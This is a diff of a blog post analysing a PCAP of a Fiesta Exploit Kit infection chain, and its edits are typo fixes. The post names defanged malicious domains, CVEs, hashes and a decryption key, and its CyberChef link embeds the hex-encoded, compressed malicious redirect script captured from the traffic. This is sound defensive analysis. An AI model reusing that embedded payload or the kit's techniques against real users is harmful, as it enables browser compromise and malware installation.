@@ -5,7 +5,7 @@ date:   2018-12-26 15:33:28 -0500
 categories: blog
 ---
 
-For funsies, snagged a Traffic Analysis Exercise from Malware-Traffic-Analysis.net. If you want to follow along at home, here is the link:
+For funsies, I snagged a Traffic Analysis Exercise from Malware-Traffic-Analysis.net. If you want to follow along at home, here is the link:
 [http://www.malware-traffic-analysis.net/2014/12/08/index.html](http://www.malware-traffic-analysis.net/2014/12/08/index.html)
 
 
@@ -18,20 +18,20 @@ Network artifacts within this PCAP are consistent with 5 stages of the Fiesta Ex
 
 ### **Stage 1: Visiting Compromised Site**
 
-Artifacts reflect the incident resulted from a user clicking a Google.de link that redirect the user to ExcelForum.com. ExcelForum, a Microsoft Excel user forum was running vBulletin 4.1.8 at the time of the attack and was vulnerable to several CVEs including CVE-2012-4328.
+Artifacts reflect the incident resulted from a user clicking a Google.de link that redirected the user to ExcelForum.com. ExcelForum, a Microsoft Excel user forum, was running vBulletin 4.1.8 at the time of the attack and was vulnerable to several CVEs including CVE-2012-4328.
 
 ### **Stage 2: Gate Redirection**
 ![TCP Stream 2]({{ site.baseurl }}/images/fiestaEKtcp2.png)
 
-In tcp.stream 2, analysis reveals the malicious JavaScript injected under the the script reference for the CKEditor in the HEAD section of the page. The JavaScript references a external site: hxxp://magggnitia.com/?Q2WP=p4VpeSdhe5ba&nw3=9n6MZfU9I_1Ydl8y&9M5to=_8w6t8o4W_abrev&GgiMa=8Hfr8Tlcgkd0sfV&t6Mry=I6n2. In WireShark, we can see this being delivered in tcp.stream 8. After extracting the payload, I chucked it into CyberChef to take a look at it. 
-[(![Click to Open In CyberChef]({{ site.baseurl }}/images/fiestaEKgate.png)](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Gunzip()JavaScript_Beautify('%5C%5Ct','Auto',true,true)Find_/_Replace(%7B'option':'Regex','string':'%5C%5C%5C'%20%5C%5C%2B%20%5C%5C%5C''%7D,'',true,false,true,false)&input=MWY4YjA4MDAwMDAwMDAwMDAwMDM3NTU1NTk1M2RiM2ExNGZlMmI4NjA3NjQ0ZjA0YjE0MzkzMTQzNGJhNzc0YTA5ZDA4NWFkMGQyZDI1ZTMwN2Q5OTY2ZDA1NDdkZWU0MmM0ZGYzZGY3YmJjMjQwZTc3ZTYzZTQ5M2EzYWU3ZmJjZTJhNGQ0NTkwNjcxNDQ5MzYxNzAxNTM3MTg2ODgxYmM3ZjI5NDIyMmY3NjhiMTk5NzBhMTEyNTIyNTVkMDg1OTA1ZWJjMjA0OTE2N2JlZjY5MjU5YTU0OWEzNjUxNWNlNjQxMjM5YTk2NzAzNjk5YjM0YzViNDg2ZjZiMTRkYzNkY2Q1NDM2NzY0NzU3MTQ4NTRhMjVlN2E4ODNiYTVkNGYwNGIwOGEwNTc3MjRhYzZjYzY0ZjA0YWNiMjNiNzg1NWIwMjZhMmJmOGM0YmJkODdmOGU2MjdhYzVmYWY1ZjE2MTlhY2QzNjc3ZTdkMDllYmY1ZTljM2YxMjc1OGZiYTg2MjAzNzcyOTMwOWU2Y2RkMjYzNzhiNmNiNWNjMWY1ZjJlNjljYjRlZmM0MmJhNGFjNDUyY2JiOWZhMThjN2FmODJlYjEyODhmMTljNDUwNWM3N2M5OTg4OGNlN2M2MWE0MDRlZGNlYTlhOTZkNzFkNDQ1MTg3ZTcyZTRiYjg1ZTY5MWE5ZDQzYTIzNWRhZjRiMGQzZWM0ZTU0N2M3ZDNiZmVhZTMyMjEwM2JkNTI0OTk4MGE2OWY3OTA2NDVjMTU5OTI0OWIxZDdkZjA4NmRlNTg5NzExMzQ4NDQ4NDM5ZDk2YmY4YTJkZTcyYzczYzNlYTY2ZWI0ZTIzNTdjMDQ2NjUxMTQ1ZDUzOWY2N2QxMDY5NTQzM2FiMjM5NzVlYjUxN2JlYTZkNzY4MjcxMTk3ODEwYWI1N2YzNGQzZDBkNjNiZjVlNjEyNmFjNTk3ZjdiZTVlZDMxOTk1NWRhMzczNDBiNTYzYWIzNWU5ZDBjNmE3MDY5MGQ0NTRmZmMxNDEwNGUxYzZhNzFhYWNkMjZhOTBkZTU4MzQyODliM2EyMDkwOTc5NTJjNjQ5M2YyNDYyOTJmOWNiY2NlNmQ4ZDg5Y2IwMDBkODM2YzM2NzU3YTliNzRlYzY1NzkxYzNlM2Q1ZmFiMWY5ZjNlYTc0MjM3ZDZjMmQ3MGZkYWJjMWZiYWIzNmZkM2JiNTFmMTNkZjE2ZmQzZmI0M2EzYWVjMWI2YTY5MjJmYjQ0YmE2Yjg2ZTkwNmQ3MTAxN2QyYzY2NWNkZjllODNlNjZjNzRjYzY1YmYzN2U4YmJhNjY5OTBmY2ZmZjAzMTFhZjYzYzY2Nzk4ZTM1MThiYTE2MWIzODY3ODNlMWMwN2JlNzlkYmQzNzA3Y2NlMmJlNjlhMjVkZmIzNWVkYTJhOWFjZTAxYjFlZTU3Y2RkMDg3YzA2ODc0ZDFiZGZmNGY5Y2JhOGI4N2JiZGZjZmQ0MTlmMGViMzNhODJjNTE5ZjZmYjIxNjY3MzFjNTkyNGIyMjg4YTY1MTQzMzBmMTEzNmE3ODg3OWRlNjgwZWMzZjE1NWU0MzBiNDFjODYxZDc0NDFhYzE0NzNjM2VhMDY5MWM1MTk0NTk3ZjdiNzFmNjNhOTRhNGRiMGU1NjA1ZDhkZmQ4NGNkZWQ3Zjc3M2IxZGE4NGFkYWYzN2FjODI3MDA2NWViOTE1NWM5NWExZmQ1OGZmOWEzZjA5Y2ZiMmJiZGY2MmY1ZDkxNzQ0NTUxOTFmM2VjNDM1MDExNmVhMzJkNWY5MTQ5YmFiMmY3YTYyNGJlN2M4YzllYzJkYjg3NDI1Zjk5MTE5Njg5NTU2MzI0NDM5MjBjMjk1MjNjNmZjZDQxNjE5MjBjNmRiZDU0NmExMWFlMTJmN2Y5NjY3YWY3YzU3ZjY5ZThmZDk0ZjgyOWRkNzM2YTZiYmZjN2Q1ZmQyOWU0ZTAxZGU5MGFlY2E3YzY5ZjNmZmIzN2NiOWRiY2U1Nzg3ZTQ4YzVhZjBiNDdjZTFiMGEyNmIwYzM4OWMzYTlkZTFkNjdjMjgzMThiYmMyMjA0Y2JjNjFhZDlhYjEwNTc2Mzg2NjAyN2FiMDcxYzY3YzUzZjZhYTBmNWFiZWQ5ZDVhZjZmOWYyZjMyOTVjYTg2NzA5YTBlNzA2MTE2MzhlYWUxNTBlMjZjZThlMjU0MGRmMWNhYzI3MjM2YzczZWMzY2UxY2IzMDBiYjg1YzRiZjhiM2U0ZTUyNzAwZTdhMjE4OWYzZjJiOTJkMjFjZjE5NmM5YzNjOGU4YWYyZTFlNTI0ZTJiZTNhM2ZiNmZhNzBlODlkMjY0YjUyNGFlM2E0OTQ5Y2MyNmU5ODJjMTEwMTY4OGFmMmNjNDU2NDA1M2QyNmZjYWM3ZWMxMTEwMTQ3Mjg3MmYzN2M1YzIyMmRhMTNlNTE4ZjIyOTg5NTUxNTQwYWFhMGZhNTgzZjI4YmQ1OTgwNTc3NWIxYjcwOGQyMmE3N2NlY2JkMTUyMmUwM2M0NTBiZTFhOTEwZGE5M2MxODdjMTQ1MTAwMjEwMzgwZWFkOWEyNDMwZjUxZjQzMTE0MTUzODY2MGU2NjYxY2U2NzQxNGQ1ZDAwNGEyMDdiZmQ0MmEwMjU4MTY1MDY0OTlhOGNjZjU5Yjk3ZTBlODY4YWY2NDQ3NDcwN2ZiNGQ2MmFjMjE5Yjk0MDUwNDUyNDVlYjU2MGZhNWFkYWYyY2EzOTQ0Y2MwMzc5YjgyNDY3NWYwNTliYjA3NWU3YjAyYjFkYmQ0OTk1NzAyNDg5MDRkNzc3ZjUwMzMzZjUxY2ZkNjIxNTg2MzYyZGExMzA4YzdkNjQxZDNkODZjZjZlNmI4MmRhZTQxZmUwMjg5YTRmN2JhOWIwNzAwMDA)
+In tcp.stream 2, analysis reveals the malicious JavaScript injected under the script reference for the CKEditor in the HEAD section of the page. The JavaScript references an external site: hxxp://magggnitia.com/?Q2WP=p4VpeSdhe5ba&nw3=9n6MZfU9I_1Ydl8y&9M5to=_8w6t8o4W_abrev&GgiMa=8Hfr8Tlcgkd0sfV&t6Mry=I6n2. In WireShark, we can see this being delivered in tcp.stream 8. After extracting the payload, I chucked it into CyberChef to take a look at it. 
+[![Click to Open In CyberChef]({{ site.baseurl }}/images/fiestaEKgate.png)](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Gunzip()JavaScript_Beautify('%5C%5Ct','Auto',true,true)Find_/_Replace(%7B'option':'Regex','string':'%5C%5C%5C'%20%5C%5C%2B%20%5C%5C%5C''%7D,'',true,false,true,false)&input=MWY4YjA4MDAwMDAwMDAwMDAwMDM3NTU1NTk1M2RiM2ExNGZlMmI4NjA3NjQ0ZjA0YjE0MzkzMTQzNGJhNzc0YTA5ZDA4NWFkMGQyZDI1ZTMwN2Q5OTY2ZDA1NDdkZWU0MmM0ZGYzZGY3YmJjMjQwZTc3ZTYzZTQ5M2EzYWU3ZmJjZTJhNGQ0NTkwNjcxNDQ5MzYxNzAxNTM3MTg2ODgxYmM3ZjI5NDIyMmY3NjhiMTk5NzBhMTEyNTIyNTVkMDg1OTA1ZWJjMjA0OTE2N2JlZjY5MjU5YTU0OWEzNjUxNWNlNjQxMjM5YTk2NzAzNjk5YjM0YzViNDg2ZjZiMTRkYzNkY2Q1NDM2NzY0NzU3MTQ4NTRhMjVlN2E4ODNiYTVkNGYwNGIwOGEwNTc3MjRhYzZjYzY0ZjA0YWNiMjNiNzg1NWIwMjZhMmJmOGM0YmJkODdmOGU2MjdhYzVmYWY1ZjE2MTlhY2QzNjc3ZTdkMDllYmY1ZTljM2YxMjc1OGZiYTg2MjAzNzcyOTMwOWU2Y2RkMjYzNzhiNmNiNWNjMWY1ZjJlNjljYjRlZmM0MmJhNGFjNDUyY2JiOWZhMThjN2FmODJlYjEyODhmMTljNDUwNWM3N2M5OTg4OGNlN2M2MWE0MDRlZGNlYTlhOTZkNzFkNDQ1MTg3ZTcyZTRiYjg1ZTY5MWE5ZDQzYTIzNWRhZjRiMGQzZWM0ZTU0N2M3ZDNiZmVhZTMyMjEwM2JkNTI0OTk4MGE2OWY3OTA2NDVjMTU5OTI0OWIxZDdkZjA4NmRlNTg5NzExMzQ4NDQ4NDM5ZDk2YmY4YTJkZTcyYzczYzNlYTY2ZWI0ZTIzNTdjMDQ2NjUxMTQ1ZDUzOWY2N2QxMDY5NTQzM2FiMjM5NzVlYjUxN2JlYTZkNzY4MjcxMTk3ODEwYWI1N2YzNGQzZDBkNjNiZjVlNjEyNmFjNTk3ZjdiZTVlZDMxOTk1NWRhMzczNDBiNTYzYWIzNWU5ZDBjNmE3MDY5MGQ0NTRmZmMxNDEwNGUxYzZhNzFhYWNkMjZhOTBkZTU4MzQyODliM2EyMDkwOTc5NTJjNjQ5M2YyNDYyOTJmOWNiY2NlNmQ4ZDg5Y2IwMDBkODM2YzM2NzU3YTliNzRlYzY1NzkxYzNlM2Q1ZmFiMWY5ZjNlYTc0MjM3ZDZjMmQ3MGZkYWJjMWZiYWIzNmZkM2JiNTFmMTNkZjE2ZmQzZmI0M2EzYWVjMWI2YTY5MjJmYjQ0YmE2Yjg2ZTkwNmQ3MTAxN2QyYzY2NWNkZjllODNlNjZjNzRjYzY1YmYzN2U4YmJhNjY5OTBmY2ZmZjAzMTFhZjYzYzY2Nzk4ZTM1MThiYTE2MWIzODY3ODNlMWMwN2JlNzlkYmQzNzA3Y2NlMmJlNjlhMjVkZmIzNWVkYTJhOWFjZTAxYjFlZTU3Y2RkMDg3YzA2ODc0ZDFiZGZmNGY5Y2JhOGI4N2JiZGZjZmQ0MTlmMGViMzNhODJjNTE5ZjZmYjIxNjY3MzFjNTkyNGIyMjg4YTY1MTQzMzBmMTEzNmE3ODg3OWRlNjgwZWMzZjE1NWU0MzBiNDFjODYxZDc0NDFhYzE0NzNjM2VhMDY5MWM1MTk0NTk3ZjdiNzFmNjNhOTRhNGRiMGU1NjA1ZDhkZmQ4NGNkZWQ3Zjc3M2IxZGE4NGFkYWYzN2FjODI3MDA2NWViOTE1NWM5NWExZmQ1OGZmOWEzZjA5Y2ZiMmJiZGY2MmY1ZDkxNzQ0NTUxOTFmM2VjNDM1MDExNmVhMzJkNWY5MTQ5YmFiMmY3YTYyNGJlN2M4YzllYzJkYjg3NDI1Zjk5MTE5Njg5NTU2MzI0NDM5MjBjMjk1MjNjNmZjZDQxNjE5MjBjNmRiZDU0NmExMWFlMTJmN2Y5NjY3YWY3YzU3ZjY5ZThmZDk0ZjgyOWRkNzM2YTZiYmZjN2Q1ZmQyOWU0ZTAxZGU5MGFlY2E3YzY5ZjNmZmIzN2NiOWRiY2U1Nzg3ZTQ4YzVhZjBiNDdjZTFiMGEyNmIwYzM4OWMzYTlkZTFkNjdjMjgzMThiYmMyMjA0Y2JjNjFhZDlhYjEwNTc2Mzg2NjAyN2FiMDcxYzY3YzUzZjZhYTBmNWFiZWQ5ZDVhZjZmOWYyZjMyOTVjYTg2NzA5YTBlNzA2MTE2MzhlYWUxNTBlMjZjZThlMjU0MGRmMWNhYzI3MjM2YzczZWMzY2UxY2IzMDBiYjg1YzRiZjhiM2U0ZTUyNzAwZTdhMjE4OWYzZjJiOTJkMjFjZjE5NmM5YzNjOGU4YWYyZTFlNTI0ZTJiZTNhM2ZiNmZhNzBlODlkMjY0YjUyNGFlM2E0OTQ5Y2MyNmU5ODJjMTEwMTY4OGFmMmNjNDU2NDA1M2QyNmZjYWM3ZWMxMTEwMTQ3Mjg3MmYzN2M1YzIyMmRhMTNlNTE4ZjIyOTg5NTUxNTQwYWFhMGZhNTgzZjI4YmQ1OTgwNTc3NWIxYjcwOGQyMmE3N2NlY2JkMTUyMmUwM2M0NTBiZTFhOTEwZGE5M2MxODdjMTQ1MTAwMjEwMzgwZWFkOWEyNDMwZjUxZjQzMTE0MTUzODY2MGU2NjYxY2U2NzQxNGQ1ZDAwNGEyMDdiZmQ0MmEwMjU4MTY1MDY0OTlhOGNjZjU5Yjk3ZTBlODY4YWY2NDQ3NDcwN2ZiNGQ2MmFjMjE5Yjk0MDUwNDUyNDVlYjU2MGZhNWFkYWYyY2EzOTQ0Y2MwMzc5YjgyNDY3NWYwNTliYjA3NWU3YjAyYjFkYmQ0OTk1NzAyNDg5MDRkNzc3ZjUwMzMzZjUxY2ZkNjIxNTg2MzYyZGExMzA4YzdkNjQxZDNkODZjZjZlNmI4MmRhZTQxZmUwMjg5YTRmN2JhOWIwNzAwMDA)
 Using CyberChef we can see the script from magggnitia.com has the following notable functionalities:
 * Compressed data
 * Light obfuscation
 * Uses DOMContentLoaded event listener to begin execution when the initial HTML document has been completely loaded and parsed
 * Checks for the following conditions before redirection
     * ThUXGtVIJqi() - Checks for the existence of the cmRjNEuSpfMqO cookie to prevent redundant infection. If the cookie does not exist, it will set it as a flag. 
-    * XPqiYBbnv() - Checks for the Existence of Trident in the UA string meaning the next stage payloads depend on attacking Internet Explorer.
+    * XPqiYBbnv() - Checks for the existence of Trident in the UA string meaning the next stage payloads depend on attacking Internet Explorer.
     * Reviews User Agent String for Browser and OS Version attempting to exclude 64-bit processes. This is most likely because the next stage only contains 32-bit payloads.
 * Redirects to hxxp://digiwebname.in/6ktpi5xo/PoHWLGZwrjXeGDG3P-I5 payload
 
@@ -100,25 +100,25 @@ The second of the five leveraged exploits in the EK, presents the user with a pa
 ![JS Exploit]({{ site.baseurl }}/images/fiestaEKjsview.png)
 I find that bit of trivia interesting because it speaks to how the kit was built and how much actual unique code I need to reverse. Also, I noticed many of the variable names in these scripts are 4 letter English words with 1 or 2 extra characters on the end...
 
-The HTML document body contains two div elements "soiln" and “debtx”, each containing encoded objects. Chrome’s developer tools we used to deobfuscate the bulk of the code.
-* soiln - decodes to contains 2907 bytes of base64ed data with Shannon entropy of 7.7 which is consistent with encrypted or compressed data.
+The HTML document body contains two div elements "soiln" and “debtx”, each containing encoded objects. Chrome’s developer tools were used to deobfuscate the bulk of the code.
+* soiln - decodes to 2907 bytes of base64ed data with Shannon entropy of 7.7 which is consistent with encrypted or compressed data.
 * debtx - contains script and 2197 bytes of encoded data with a Shannon entropy of 5.8 which is consistent with encoded scripts.
 
 This code is densely obfuscated and I could dig deeper on this later if I get really bored.
 
 **buvyoem41.pdf**
 
-The third package delivered is a PDF containing an exploit for CVE- 2010-0188, Unspecified vulnerability in Adobe Reader and Acrobat 8.x before 8.2.1 and 9.x before 9.3.1. In TCP stream 32 we can see the buvyoem41.pdf being delivered from the landing page request. 
+The third package delivered is a PDF containing an exploit for CVE-2010-0188, Unspecified vulnerability in Adobe Reader and Acrobat 8.x before 8.2.1 and 9.x before 9.3.1. In TCP stream 32 we can see the buvyoem41.pdf being delivered from the landing page request. 
 ![PDF Dumper]({{ site.baseurl }}/images/fiestaEKPDFDumper.png)
 This PDF document presents with repeating nonsensical sentences and contains 3 notable objects:
 * Object 9: Obfuscated JavaScript containing more Base64 encoded encrypted JavaScript that calls Object 10 via Object 6.
-    * Interestingly enough, the JavaScript in the PDF uses the same "I450S+bxX=9UjpAG7fNaq3sd2M61Ze8LkcJRhg" for a key but using "polyu" as decrypt function.
+    * Interestingly enough, the JavaScript in the PDF uses the same "I450S+bxX=9UjpAG7fNaq3sd2M61Ze8LkcJRhg" for a key but using "polyu" as the decrypt function.
 * Object 10: Minisets of Base64 encoded shellcode.
 When loaded, this PDF downloads (TCP stream 34) and executes an encrypted portable executable: [MD5 72c2c343ebea67767de167aaf254a91d].
 
 **dszohrfb90.xap**
 
-The forth package delivered is a Microsoft Silverlight file containing an exploit for CVE-2013-0074.A:  Double Dereference Vulnerability. Using 7zip to extract the contents, we can see the following files within:
+The fourth package delivered is a Microsoft Silverlight file containing an exploit for CVE-2013-0074: Double Dereference Vulnerability. Using 7zip to extract the contents, we can see the following files within:
 * AppManifest.xaml
     * Windows markup file that references kagfhwyr720.dll
 * kagfhwyr720.dll
@@ -136,7 +136,7 @@ The final exploit delivered was a Java JAR file that exploits CVE-2012-0507, a v
 
 ### **Stage 5: Installation**
 
-Each of the exploits in this kit delivers the same portable executable, Punto Switcher MD5: 72c2c343ebea67767de167aaf254a91d. Googling Puntu Switcher reveals it is a questionably legitimate Russian software used to switch keyboard layout between languages. Analysis of this sample suggests that this software was hollowed and used to host malicious code.
+Each of the exploits in this kit delivers the same portable executable, Punto Switcher MD5: 72c2c343ebea67767de167aaf254a91d. Googling Punto Switcher reveals it is a questionably legitimate Russian software used to switch keyboard layout between languages. Analysis of this sample suggests that this software was hollowed and used to host malicious code.
 
 Notable characteristics:
 * Persistence
